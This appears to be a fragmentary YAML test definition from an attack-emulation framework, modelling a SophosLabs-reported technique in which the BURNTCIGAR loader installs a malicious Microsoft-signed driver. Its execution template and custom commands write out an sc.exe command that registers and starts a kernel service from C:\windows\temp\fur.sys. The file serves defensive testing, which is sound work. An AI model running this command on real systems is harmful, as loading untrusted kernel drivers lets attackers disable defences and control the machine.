...
name: fur.sys
description: SophosLabs has discovered that threat actors are using a new driver loader
  called BURNTCIGAR to install a malicious driver signed with Microsoft.
author: Guus Verbeek
version: 1.0.0
capabilities:
...
execution:
  template: sc.exe create fur.sys binPath=C:\windows\temp\fur.sys type=kernel && sc.exe
    start fur.sys
  sandbox: execFile
  timeout_seconds: 30
  shell: true
...
- method: custom
  ...
  commands:
  - sc.exe create fur.sys binPath=C:\windows\temp\fur.sys type=kernel && sc.exe start
    fur.sys
references:
- label: Reference
